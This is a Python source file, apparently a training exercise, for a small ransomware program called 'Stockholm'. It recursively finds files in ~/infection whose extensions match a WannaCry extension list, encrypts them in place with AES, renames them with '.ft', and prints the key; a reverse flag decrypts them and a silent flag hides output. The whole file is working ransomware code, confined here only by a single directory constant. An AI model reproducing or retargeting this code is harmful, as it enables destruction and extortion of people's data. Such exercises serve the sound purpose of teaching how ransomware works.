#!/usr/bin/python3
import argparse
import os
from Crypto.Cipher import AES

VERSION = "1.0.0"
TARGET_DIR = "infection"
EXT = ".ft"
EXTENSIONS_FILE = "wannacry_file_extensions.txt"

class Style():
	RED = "\x1b[31m"
	GREEN = "\x1b[32m"
	CYAN = "\x1b[96m"
	RESET = "\033[0m"

class Flags():
	version = False
	reverse = False
	silent = False

def error_exit(msg):
	print(f'Error:', msg)
	exit(1)

def error_continue(msg):
	print(f'Error:', msg)

class Stockholm:
	def __init__(self, key):
		self.succss = 0
		if key:
			self.key = bytes.fromhex(key)
		else:
			self.key = os.urandom(32)

	def log(self, msg, end="\n"):
		if Flags.silent:
			return
		print(msg, end=end)

	def decrypt(self, contents):
		nonce = contents[:16]
		tag = contents[16:32]
		ciphertext = contents[32:]
		cipher = AES.new(self.key, AES.MODE_EAX, nonce)
		data = cipher.decrypt_and_verify(ciphertext, tag)
		return data

	def encrypt(self, contents):
		cipher = AES.new(self.key, AES.MODE_EAX)
		ciphertext, tag = cipher.encrypt_and_digest(contents)
		return cipher.nonce + tag + ciphertext

	def handle_target(self, file):
		try:
			if Flags.reverse:
				new_filename = file[:-len(EXT)]
				self.log(f"decrypt: {file}", "")
			else:
				new_filename = file + EXT
				self.log(f"encrypt: {file}", "")

			with open(file, 'r+b') as f:
				contents = f.read()
				if Flags.reverse:
					result = self.decrypt(contents)
				else:
					result = self.encrypt(contents)
				os.rename(file, new_filename)
				f.truncate(0)
				f.seek(0)
				f.write(result)
			self.log(f" -> {Style.GREEN}{new_filename}{Style.RESET}")
			self.succss = self.succss + 1
		except Exception as e:
			self.log(f" -> {Style.RED}fail{Style.RESET}")
			error_continue(e)

	def get_targets(self, dir_path, files, exts):
		contents = os.listdir(dir_path)
		for f in contents:
			filename = dir_path + "/" + f
			if not os.path.isfile(filename):
				self.get_targets(filename, files, exts)
			ext_idx = filename.rfind(".")
			if ext_idx >= 0 and filename[ext_idx:] in exts:
				files.append(filename)

	def get_extensions(self):
		try:
			with open(EXTENSIONS_FILE, 'r') as f:
				contents = f.readlines()
			extensions = set()
			for line in contents:
				extensions.add(line.strip())
			return extensions
		except Exception as e:
			error_exit(e)

	def check_directory(self):
		try:
			home = os.path.expanduser('~')
			dir_path = home + "/" + TARGET_DIR
			if not os.path.exists(dir_path):
				error_exit(f"directory '{TARGET_DIR}' does not exist")
			return dir_path
		except Exception as e:
			error_exit(e)

	def stockholm(self):
		dir_path = self.check_directory()
		files = []
		if Flags.reverse:
			self.get_targets(dir_path, files, [EXT])
		else:
			exts = self.get_extensions()
			self.get_targets(dir_path, files, exts)

		if not files:
			error_exit(f"target files does not exist")

		for file in files:
			self.handle_target(file)

		if not Flags.reverse and self.succss:
			print(f"secret key: {Style.CYAN}{bytes.hex(self.key)}")

def parse_args():
	parser = argparse.ArgumentParser()
	parser.add_argument("-v", "--version", action="store_true",
						help="show the version of the program",)
	parser.add_argument("-r", "--reverse", metavar="KEY",
						help="reverse the infection using the key")
	parser.add_argument("-s", "--silent", action="store_true",
						help="the program will not produce any output")
	args = parser.parse_args()

	if args.version:
		Flags.version = True
	if args.reverse:
		Flags.reverse = True
	if args.silent:
		Flags.silent = True
	return args

def main():
	args = parse_args()
	if Flags.version:
		print(f"Stockholm {VERSION}")
	else:
		stockholm = Stockholm(args.reverse)
		stockholm.stockholm()

if __name__ == '__main__':
	main()
